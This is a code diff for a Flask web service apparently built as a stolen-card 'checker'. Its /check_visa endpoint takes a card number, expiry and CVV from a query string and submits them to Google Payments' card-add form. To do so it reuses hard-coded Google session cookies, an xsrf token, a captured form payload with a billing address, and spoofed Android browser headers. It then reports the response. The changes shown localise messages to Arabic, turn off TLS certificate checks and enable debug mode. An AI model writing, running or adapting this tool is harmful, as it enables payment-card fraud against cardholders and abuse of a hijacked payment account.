@@ -1,25 +1,29 @@
 from flask import Flask, request, jsonify
 import requests
+import urllib3
 import re
+import time
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 
-def extract_text(text):
-    pattern = re.compile(r'[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]+')
-    matches = pattern.findall(text)
-    return ' '.join(matches) if matches else "No response text found"
+def extract_arabic_text(text):
+    arabic_pattern = re.compile(r'[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]+')
+    matches = arabic_pattern.findall(text)
+    return ' '.join(matches) if matches else "لا يوجد نص عربي في الاستجابة"
 
 @app.route('/check_visa', methods=['GET'])
 def check_visa():
     visa_data = request.args.get('visa')
     
     if not visa_data:
-        return jsonify({'error': 'Please provide visa data in format: card|month|year|cvv'}), 400
+        return jsonify({'error': 'يجب تقديم بيانات الفيزا في الصيغة: رقم_الفيزا|الشهر|السنة|cvv'}), 400
     
     try:
         card_number, month, year, cvv = visa_data.split('|')
     except ValueError:
-        return jsonify({'error': 'Invalid format. Use: card|month|year|cvv'}), 400
+        return jsonify({'error': 'صيغة البيانات غير صحيحة. يجب أن تكون: رقم_الفيزا|الشهر|السنة|cvv'}), 400
     
     cookies = {
         'OTZ': '8178671_44_48_171240_44_319500',
@@ -29,7 +33,6 @@ def check_visa():
         '__utma': '207539602.2100594883.1742201890.1754402052.1754405992.18',
         '__utmc': '207539602',
         '__utmz': '207539602.1754405992.18.18.utmcsr=wallet.google.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
-        '__utmt': '1',
         'SID': 'g.a000zwiGj06BhkhVqEo5BYRuh_VJLlGFwHjQWESKm5mPlz9Cs5OFm9NUpoLD3RVSrcmadKZoEAACgYKASQSARYSFQHGX2MiPBizAyRYaHFpAu249zuMJxoVAUF8yKpRaVk1Oeqz8H8e2lbMNe5w0076',
         '__Secure-1PSID': 'g.a000zwiGj06BhkhVqEo5BYRuh_VJLlGFwHjQWESKm5mPlz9Cs5OFmjZUKdm5wPv5TYrWcMvZ3wACgYKAQkSARYSFQHGX2MiMkDcVTieV5aD_kYkOct4BBoVAUF8yKp1mcvZTjvs0A5WV8j_MddJ0076',
         '__Secure-3PSID': 'g.a000zwiGj06BhkhVqEo5BYRuh_VJLlGFwHjQWESKm5mPlz9Cs5OFDLMKsJI-tK-lD078Nft8UQACgYKARcSARYSFQHGX2MiF4b_zhtdA_lHtEeVmYUdJhoVAUF8yKoSDW7_gb2NmW9rMIWMwn2S0076',
@@ -39,11 +42,12 @@ def check_visa():
         'SAPISID': 'l36_yvuIn4OioL92/AE6do6fxgQaZuFUMB',
         '__Secure-1PAPISID': 'l36_yvuIn4OioL92/AE6do6fxgQaZuFUMB',
         '__Secure-3PAPISID': 'l36_yvuIn4OioL92/AE6do6fxgQaZuFUMB',
-        '__utmb': '207539602.8.8.1754406177113',
-        'SIDCC': 'AKEyXzVA3kjvvaTmBu1vEf82ISUhNfM-Pb_GCv_CyO-mcffSJTfpT2vmkZ2burNw916Kzd8RdA',
-        '__Secure-1PSIDCC': 'AKEyXzXG3S87Tfx9PJom1H6VwLSMNtUqqJrxJAiwAD6gmS7kZ4G5Kxd07pqGLLbVJF00Ne3LqHA',
-        '__Secure-3PSIDCC': 'AKEyXzUYPI-tXUZv1ggfiGGlj5HUGb3tz9sSORnI4u8k36i1Ay0F9n6AB4f3EcXwO7oTyXWP5pM',
-        'S': 'billing-ui-v3=8K7dY7LGplDnDajd7I7I2bpW-tynemF3:billing-ui-v3-efe=8K7dY7LGplDnDajd7I7I2bpW-tynemF3',
+        '__utmt': '1',
+        '__utmb': '207539602.13.8.1754407192237',
+        'S': 'billing-ui-v3=tVkoyDRSGA4hKFFqCvum6PlHAbQKnG9c:billing-ui-v3-efe=tVkoyDRSGA4hKFFqCvum6PlHAbQKnG9c',
+        'SIDCC': 'AKEyXzWCMsZS6Xl11aGYsxWxz5Iv6pEA2Wu9mwtyAbVtHhsue16A93HKViV4kD5YsoaJrzlzXw',
+        '__Secure-1PSIDCC': 'AKEyXzVqApz35_o_RlJUvd71hK0AfdUeUutM9HQFDvtt6S-kctAChLI06zo7GEP-3xlZfP7zCTI',
+        '__Secure-3PSIDCC': 'AKEyXzVwYgR8ZKbzNbS75qqg2zNIqSTLWvBO4nBFsU-IDa67Y6TVhlcO0kUmUKOuXVD8WxWUTCM',
     }
 
     headers = {
@@ -52,45 +56,55 @@ def check_visa():
         'accept-language': 'ar-AE,ar;q=0.9,en-IN;q=0.8,en;q=0.7,en-US;q=0.6,he;q=0.5',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://payments.google.com',
-        'referer': 'https://payments.google.com/payments/u/1/embedded/instrument_manager',
+        'referer': 'https://payments.google.com/payments/u/1/embedded/instrument_manager?tc=96%2C87&wst=1754407183515&cst=1754407189299&si=3046999268453971&pet&sri=2&hmi=false&ipi=1503s6ad0qgc&hostOrigin=aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..&eo=https%3A%2F%2Fwallet.google.com&origin=https%3A%2F%2Fwallet.google.com&ancori=https%3A%2F%2Fwallet.google.com&mm=e&hl=ar&style=%3Am2&ait=GAIA&cn=%24p_hjw70g4ies90&fms=true&actionToken=CiQIASICVVNoAXAAeAGaAQ8KByCmn9iv1Acg9acEYgDAAgD4AwE%3D&spul=499&cori=https%3A%2F%2Fwallet.google.com',
         'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-arch': '""',
+        'sec-ch-ua-bitness': '""',
+        'sec-ch-ua-full-version': '"137.0.7337.0"',
+        'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
         'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-model': '"SM-A307FN"',
         'sec-ch-ua-platform': '"Android"',
+        'sec-ch-ua-platform-version': '"11.0.0"',
+        'sec-ch-ua-wow64': '?0',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-client-data': 'CIOJywE=',
         'x-requested-with': 'XmlHttpRequest',
     }
 
     params = {
         'ait': 'GAIA',
-        'cn': '$p_zgxan3cqur80',
+        'cn': '$p_hjw70g4ies90',
         'eo': 'https://wallet.google.com',
         'hostOrigin': 'aHR0cHM6Ly93YWxsZXQuZ29vZ2xlLmNvbQ..',
-        'ipi': 'corpcm8ll9h6',
+        'ipi': '1503s6ad0qgc',
         'hl': 'ar',
         'mm': 'e',
         'origin': 'https://wallet.google.com',
-        'si': '923024884411451',
+        'si': '3046999268453971',
         'style': ':m2',
-        'cst': '1754406173652',
-        'wst': '1754406168231',
+        'cst': '1754407189299',
+        'wst': '1754407183515',
         's7e': '3.1.0.0;3.1.0.1',
         'rt': 'j',
-        's': '3',
+        's': '2',
     }
 
     data = {
-        'xsrf': 'AJWlU2PnH_Tz3TVACCgfSlWq4x-UXtfwVA:1754406175633',
+        'xsrf': 'AJWlU2NxhQe3Ka1yz8tf8i_1doDvY3wfKw:1754407191289',
         '3.1.0.0': card_number,
         '3.1.0.1': cvv,
-        'msg': '[[null,"ACo329ybiQMaonjyTdNtAs4mu0MXxNoUVXRsWkgMU4n+deInC7Rq9RBIBixU3FqJ1PPxjsvL1xX/7G8bQxFfd/DfWLN+Z65ydDWKHjgdL/Q9mL2kfPTiDomNxfIyIbT/nke5Wql5f23G4R5fm2dy8a4NBzYh2s2I44wi+BTnANgbiVdK1cBJoQ7383MlI+oDc77KStEQpfT9KZlY/54S2xdxd0lwUs0QgxOue1fSLIzH5KNTWStZnsPvlCg/wEPHCGlG3qKhSonUE",null,[null,[null,null,null,["!Li2lLXXNAAZAdzQfYHdC-uONdNLm8sA7ADQBEArZ1KnJK6NYjAxjkcLd5z9XpUs9CGchOT74-eTKBTFi2_cRHVP_MswbMqE3jmyUB315AgAAB5JSAAAAMGgBB34ATFdDoRwh1-xtagN63homNShL5nm0wetAykzOCBH-XSQt2k1GvXCVh0JY_9C3x7WdIsXiaahWccBXPwGlRgPQl9ZZgtM3bFyAxP5QL3yZCCgPu18FrqfoaAWbEBHoFWVqms4VUCGXpExqtK6fpXKviI0sH0ZolTd5zWB57wkpxRTyfUWgLE10LcNdFAAF6tX2_DCNwSZkG-PY2lvqHdtGsWMFlWDVg6Ml0PnQWPuuMH0VCINZpLlM6vqvMOunB_a9H4pev4-pxCk8IJtLnSNl9r-2CLns7X4ZwOjTxnvnhBWTi6Q1OSEkxwa5LhYHTr8l8qZS9d1WGYxOkI9czVS14FPT0eI0JU5hJDfBf1f8awjyMYiKKtijdSOTUca_1-PQmb4arHrMTFo2PZV0GDltoliuEGQx8152p773EH6agpioWTTC0yq4AEAmfRgqYx2LLSg-u7UfyYh5_opN2J-CKJC0u6kG4s1hwYg2whdQ4G35FcMsc7VWxrjDaMZx_EUz-tMW1McGhg3frSYwJUd55yMb5kHrqgszXUtLRtzcfrMdvilM_iHaMO62tW_2BBTcITQedHuRiCpa6IUG9CnwqkAwAAXHlCU4k3_pBd75wg5qlMPzeApfujrU15UY36iQT1eCs6M3Rw9P_Gd-6tkQmANfceiM60oCE1d8JTDBWNNfXU0yzqvIJxuvx3PgNKZDToOrv-h1vVjVTqq50X9kmvCxiHaXbz6koW47ysXskNoljKSqvI8Xahuz3i0OZG6aasKnt3VokqdGfZtvrIIGHns1-Or2s9SJDGc6cbX_VD90t7ySPxq13tNcNwR3dj1o-ReUZk2Euq7XYmIZ97Al9tNrnMWCmpJiKjLYWlo3d0gWEOXFHU9I9WPJXGI8bxObfNp7wKq4GFTHML_RUAPgQjUB-7pNcRk9rj3E2fwV0dy3d20mTsoBAjY54GtnvbRM9MJy6tPeVHwLc6OQp7bJUPa726IPV2A6skSCMNK1sU5S_wl2GI53JGA2OdkkkEABdJQQOAXZQFNu9C6v1AiX8onSE4juShdS1SuLsIr5_6m4UjYFVOTped5gQAira210ujxqKlSztlb2u8qraWQVRddi6eWb2CQoB10EEuXZLgBQQohA4ToJnZIY2A7V_qSpFbi1h8i6VKoSVf0VMiAyLVwleZG1Sjy9MR56kEEk1yq_2cNInf-kWf7i3QhetgEiYgMwhYt14m_VW6gNNj57P87kR_RF420B0YhXlI7JR3pS9NwAbvBIPcQ-S5XfT3nBYUDtPTJ2_y6aPjZfw00a7xUgVqoj4XqFYf_L22hq4t8pgpbpmwRqqHNR61Ik_1laxuJSNtj7ukoFloxHTtGlhk6gMqMK0570msF2t9r7VcuAt33aLabNj6xuaecwTkZiX4qj_cX7XmBwJuaLWAeYaABJsswL3UM5hUXzHFxTB865iLZZIqOd6YtjztasL2aj0Ad0f4YqzjKP81q_91Ahn9zyQ4i3S8byp_5QxGt0bGgCnQK0IAa3_0Xk2bEiNbuzgvJ0mO9W2K2nQB3RPncrMYwcVJXDrEaSC1kE_7vcouScnAXmXbcR1xORrJM2eVAvC-mAz1Y1M9qMvzinXJ5EVZ8JRHWu0xLVAZFw2NlbvmaWB1A1xyBgoZf0xmZKBcSqCPTCGN1BGjhAEfIQ7gT8887qahKIvRavz2VWcrIrZBxPC5i-Xiu1o5sgcZ4u747jVyiKVHBDAWG4FzWl8LrXVqOAyrHtRD0DLckTakm2XPM60zeOgqZC_nU04O0udyRbuQ5mXF4gfHakvBpslSDwt9UtDdI-cBblRgN_8jbgiT7iNOjmlj3WPH1Xe2dFbw5_89CYj8Mlsq0pnEdycoDv0Td4Hna29SnfLjnv0ALN3c_M32QVf0kDhFtBwNJWmaI6yVs0GizVbTTS7XHn6nBMXPzO9tNNoJYohjMOwbOZ_5bh3Rd_fDUYPEcVZSYal4wdvENdkH_6HOuAk2PYOYJkKxyfevzeDfLcbAVu-Qo-tSG_beBfcA9hKmft-n0C8B9cbKrTu8J9bqubPUqLZQFFMabV6U_TbIVzoOzZ-qW1qIj7KyYRl_mcmZKdDEkBiPbqrgYCk4TdqokMmnrRHDcuqGK5WOkQ383dN6Ippbl-XcWtFdyzVUuG8WCFUvCV_c9ENzhXzyoXuL1LAPDOs5CyIz7-72EbuKfGb-Yb03MXbKst1ya0b55XrO1ApzrSV32kzLKSFvZDGayxF1hvRWDBXZ4Us-JOMzTyGl0F4IXrHoCXQsmuLGuNukwH3p3mYu-rzvk56fPY8uYzhs91-phcTmK-sqNxJtL1kWLme5XbRwhp6lBvs0z4RgTEc-DcUBLstIBGKumTA-7-XhSchkIEWhIh5VvqFgYPrJXwiiuUt2jX3FtPl3kqmG7r3ALTnlfSE7pDQxfYpoXP3nKnVCeJY2U4GfwXQ1DN6cqodaTERHG1T7sQFia7fnYP3avPqml3hrnai2dNFhRaKafHRu7R_2cGDoHzq1Q26qLYonzMORRRlRlWAykCjeI5u_36dEOeUKemPviFt-_OP9h275k42g_xlua8FbJbQKSiETilP6yR32m-7JJB8GTLnh1JiJA3cthm_wnkVFDuBULDD31m6ARLlDX16bqo26VZ-ziDA5COSSK49Hfn7ZIR9Mxe1JbtCPg97LRTfyknTAf-t-rl67AX3Jv3SIZgiI7Zqun72U_bapr-afsA6EaEL5keVGXeXlNtSg41SgMv3Z2ok5lh2HqrtGJ9ARjpfKKRSjS8Zm1J_juvbUXYzNblHFNaaPdFqI1OlmHrAUFWDASAD0PumREXrNHinHKzV8jNeBGnDcLD4pQQjumVBGy8LruJqFgBaNG6Rru8WFY"]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",9,2026,null,"5168",null,"__s7e_data__61bb463a","Mr cnn",[["US",null,"TX",null,"Plano",null,null,null,null,null,null,"75074",null,["098 Fairwood Village","Oisoddn"]],null,null,null,"billingAddress",null,"CggIxLmJwwIQAQ==",2001],"CAEQAxogEgJVUxoDVVNEMAhAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
-        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,0,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,2,e8,7bdb49f6,0,95,b6540200,0,140,eea820b6,1,236,1aa4331,0,"Linux armv81,f54683f2,0,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,0,"ar2dAE,5cc3ab5f,1,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,0,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,0,5:a21,3,1987ac1c4b2,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2a7:a40,"f,1987ac1c759,"n,0,0,"t,1987ac1bc37,0,0,0,0,1987ac1bc45,1987ac1bc45,1987ac1bc45,1987ac1bc45,1987ac1bc45,0,1987ac1bc51,1987ac1c010,1987ac1c033,1987ac1c037,1987ac1c4d6,1987ac1c4d6,1987ac1c802,1987ac1c916,1987ac1c917,1987ac1c96d:a10:a31,3,"h,1,"p,108,56,"m,115,bfa,1808,ae8,20f8,a93'
+        'msg': '[[null,"ACo329zTQ5TpBRBmEeLR8v43kYvMuAzAQEa4XFP6+33dblefvzOUwz0uxazEntAksE70TDpdHDBUeBNJ/kKAthIlNvyENYf5JRF/yhdQBdaGgHNOvLW6UsF/OWoIay9+dQJFU3l8mhzWmB9cmHjR07u2KTX1radF66ekQmUO68i4+3+6c7w/cVWmBISWWErojcAZrDcmgNKR1sddjBtPLPCwf4c/Q1TrGxefFzHnAKPU8E4R7gV/lRdD3RTvlcy/pP49OuvThyx6",null,[null,[null,null,null,["!2Nul24PNAAavhfsHj4VCaLZQg7DYebs7ADQBEArZ1AjMZXkm97LE98cM8JWMX6D-g7aqasLG00FM7P8MCOENzKAbyxxgHRlYfLQVjpztAgAABSJSAAAALGgBB34ATOOASM1rJKXuZHMD91T0CCK7yEY3Q8P52CMbHsM9vl7zcYpCGTMCLJ5O95hmoHVfMs1g7G0kzbAYjn6FBQaJ89AWM6t0-W5DflnxB62ZB3rx5jKtkLPNL7XujLmr5YP64TuxWZSVihxyBCe1uUTNvsQRXDSCyxn_wrl8ox0YnwFnt6k7bJ3OJgCeuygjiHjeBbxRn5HbLHGnWbhPwakfI_MJPQZYNhwGXl6MsdrD9h26LGljQfJ7qAe54ZukTTr0ksfsMs7Dw5SS4uUOBa7JxAGKabWFiu0tygGn5U9mAzKV_qwxeaHdZTaZk6Dn3PONxhax7OzCyxaiCdo2RhVFzQH0ixkRP3k2QNjn1Vwx7ZK4S1VCQ4w5zJusOEy0sjPZj1CslWls1p3YjKK3S9itVk_LwW051WvN7VUvzAYNiISl6-nWjvgeQXU9gzxJgimFdahEwIyP_zng5tw5G8zMx6rN6AWmfouDk-xOEk2leANDQ959WQQfMosP6oHub3I1C0voTe7CrRqLk33GsVaRH-Y90DfmxyRzKsAS5y7b4WHm1_Ph3ca-N42uR-d3aVLrp34OTIuvCFvAtpRZ5mAwWlawHVlTIGd0p-UB8nKHy2O2svlsyQ5M_Txme0DBQPDoqNHvThGlFcrnmC6ZCMvjQ0OBOrzu4tVdWSjK5n3wyBBDfQGJ5LbnvvE16FEhWyHunUQdwp8Ex8vCCh50CCSR9YgglOevV1rB7SoW9cifiymuGC9sCgVi2Q8jpm_2xrkMvzy9aeq2HXaRKmueVGoBpVhgS9ubHKAEQlTcuDpngUXIsTEcyMBwOKPxWRXorFmZE62CmUjrcFyLQ9FiDBX9AQdhSV96-nZiFIJvaotFubKbZP4eWjSMcpys68lI4itHSeOL0SKNv_cad2n234GFb7rgWF4CcNViS1TqvjiYR_0CiE8srLkNMB5PMyHuFnANHS35TQuklQxRLo8DE00alxEjNF-NEAPTaDg6soY6rn6k6ZqceO9kbdCpmxXzw3MTJY5tRGpFLt7HPY6Wc-qneKQVfuoHjiuBdpmc6Nv2GHSHw9ePztA2CY6Wwp7SMZjdUmIV7VhIlINlRwagrll0efbL7KKG_oFpwb9WHGAGgp5ciWOyReP40scpiFp1Gan8LJ3b_2Mx5KQRPZcObU5kSO5RwEIChqYjF90vGxpqzGS-VLTuFskkgLdXegi-iFR_YPgVKoDQ4ZGrdZlwLrAnzEe-C0QNBRWa5DHQ8h09EZgWpTasTf8m0b9Zfs-yd6Sdml73KRWHqSB-iZSNR98tUcJ52h6N3j8BABoTyO1zlVk438aDaMQ-QJeO-6cbDeX2YKsuqzLINxIp0hxKbc6DqW7UsX6cxIQkvK7Ey1VEDiLfxUzhhmVIZsvkCjtoDvHYfbQts-YZqiqlVhaU0m7oyws6FhcmYMz197hTSS8qOEic8HQ8OBNOp7KBhioLUcBBqzSutZnOtKO2oxOC9Gt2x7mwMJhzVnK6newfbsbwQ7N86IDhgWYNdB7LytKhKxqEk9TtMGlM0sxrGYRiIDm89tuGZsxTzkEnnpCZMiIkWF5mcOcTjL5p_usOVaO7Rr2l-pwIio8H2WmRzav4ZbRG5Wew-gw05cLBpIn9ZLfgcL_zzCvdY_Vvcp-DiivHxQcAHswASaVYnkW3aavthphgP0a30pUXrPnS2L6XOcKwRg25YqH3JBYtZuJVq456va_P19Wl4Q4eFob4-D9IX7r-N0L155LdU0WItgs-qVJo5gzsRxqS_ZEFA9WbML5JFpLWjFtFplMt2YzgAjwe7hhxcAJNK37BUBWgu6G5T6vo7HHGY_ddVU4-kNHc-Nxcf48rncqQq_o-YEGwh54QQdgr4Um1lLuZIAGrauKlfPePoN9X_Fh-nWE4Iubep58S3YeCT3M60WuhNOKvJOTMWE33i_181ZMhzzx5XLfJ4849atiPSxAI0kO4671mfqtnzKfwqNG2TDUbASJ2QItTsjAcuCjX_dMbuFPDrX4VvRmLA8ug4NnoA4XpyU3rUButx3sm76_4ZYUMTJdLwQQSITujj-N21upvkQpGONWi-GKiEdevF7yrQ0Upqvrl5NFwPHxhvK45OXb5sD9Xg5HRF04mVlsMe_YpKte5XVaf5wqX22Y3jKiDIAltJq_DvxWgGs9dOzaYUOWggIWQyQPRxCopvjOHWv6YzpmjGO59_PBwVq603IIw9OwTqSU-yxw0UqSvyctNRbkgJpGBj6ZVXHenTH7LjUauZW9zhGjcTSpMKOMGMIFxExmvLCmSZVsYsaD_Fz047mUahskPBPhAbkvMC3a9iTvcI5yn3k7afJP3lUv4_xDkcaTKRaddqfmXvl4Ma5hFn0CQyksfwCctC8e8psgpugCxZnX3MnWH1uy-yp0PKO6WEWTPwtSYVsPa5A3IlkvPAFC7JgzMKChk-_dUP3kRhvlXhScSouEYe20iW_VaDWZGyuJKOfBKFjwMHv1tV5S_Gc-eKAmjqIp5kR_hIFY-cVuD-UYBbp5ah9_ZulVEnD_jykvsmHTLBf9rmiospRx2P4tPwqE4HEvIWE8DbZ2w3O8E-mINRXU-7eLRLINqvzlu22_QdA_ECYg7DjZykb4d_8nQ9kkaEsnuEtGcuZL9KLBZKnwuJlY"]]],null,null,"ar",1,1],null,null,[null,[["__secure_field__4fa1d0a7","__secure_field__4fa1d0a7",9,2026,null,"3680",null,"__s7e_data__61bb463a","Mr cnn",[["US",null,"TX",null,"Plano",null,null,null,null,null,null,"75074",null,["098 Fairwood Village","Oisoddn"]],null,null,null,"billingAddress",null,"CggIxLmJwwIQAQ==",2001],"CAEQAxogEgJVUxoDVVNEMAhAAFABYPWnBGoCCgCgARSoARSwARQ=","0.buyertos/US/6/20/en,0.privacynotice/ZZ/5/9/ar","creditCardForm-1"]]]]',
+        'kt': 'Rs2.0.8:billing_ui_v3::s11,2,26b5e19,1,140,a063ebe9,1,2b6,edd98bac,0,18,4863fd35,0,140,cb2d5c6f,0,2b6,6ad47c6c,2,e8,7bdb49f6,0,95,b6540200,0,140,eea820b6,0,236,1aa4331,0,"Linux armv81,f54683f2,1,"Google Inc.,af794515,0,"5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,d81723d1,0,"ar2dAE,5cc3ab5f,0,"Mozilla2f5.0 28Linux3b Android 103b K29 AppleWebKit2f537.36 28KHTML2c like Gecko29 Chrome2f137.0.0.0 Mobile Safari2f537.36,24a66df6,1,-b4,"Thu Jan 01 1970 023a003a00 GMT2b0200 282a48424a2a 343142 234831482827 27443133454a29,770c67fc,0,6:a21,3,1987ad1423e,10,"cardnumber,"ccmonth,"ccyear,"cvc,"ccname,"COUNTRY,"ORGANIZATION,"RECIPIENT,"ADDRESS_LINE_1,"ADDRESS_LINE_2,"LOCALITY,"POSTAL_CODE,"PHONE_NUMBER,"embedderHostOrigin,"xsrf,"sri,84,2b1:a40,"f,1987ad144ef,"n,0,0,"t,1987ad13b9c,0,0,0,0,1987ad13ba8,1987ad13ba8,1987ad13ba8,1987ad13ba8,1987ad13ba8,0,1987ad13bb8,1987ad13f72,1987ad13f95,1987ad13f95,1987ad1425f,1987ad1425f,1987ad145c7,1987ad14802,1987ad14803,1987ad14835:a10:a31,3,"h,1,"p,74,43,"m,1249,1198,707,2138'
     }
 
     try:
+        time.sleep(2)
         session = requests.Session()
+        session.verify = False
         session.headers.update(headers)
         
         response = session.post(
@@ -98,22 +112,22 @@ def check_visa():
             params=params,
             cookies=cookies,
             data=data,
-            timeout=15
+            timeout=15,
+            allow_redirects=True
         )
         
-        content = extract_text(response.text)
+        arabic_content = extract_arabic_text(response.text)
         
         return jsonify({
-            'status': 'success' if response.status_code == 200 else 'failed',
             'status_code': response.status_code,
-            'response': content
+            'content': arabic_content
         })
         
-    except Exception as e:
+    except requests.exceptions.RequestException as e:
         return jsonify({
-            'status': 'error',
-            'message': str(e)
+            'error': str(e),
+            'message': 'تحت صيانة'
         }), 500
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=True)
